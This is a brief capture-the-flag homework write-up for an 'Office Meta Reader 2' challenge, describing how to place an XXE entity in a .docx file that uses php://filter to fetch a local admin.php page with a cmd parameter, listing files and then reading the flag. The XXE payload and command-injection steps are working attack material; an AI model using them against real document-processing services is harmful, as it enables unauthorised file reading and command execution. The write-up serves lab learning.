# Homework 9-Bii - Office Meta Reader 2 [100 points] (5 solves)
This challenge using the same port of the exercise `Office Meta Reader 1`, but the location of flag is in the `admin.php`.\
Draft our payload in the same `.docx` file as in exercise, replace the second line to `<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://localhost:35053/admin.php?cmd=ls"> ]>`.\
After seeing the flag file in the list, we can just replace `ls` with `cat filename` to view the flag. 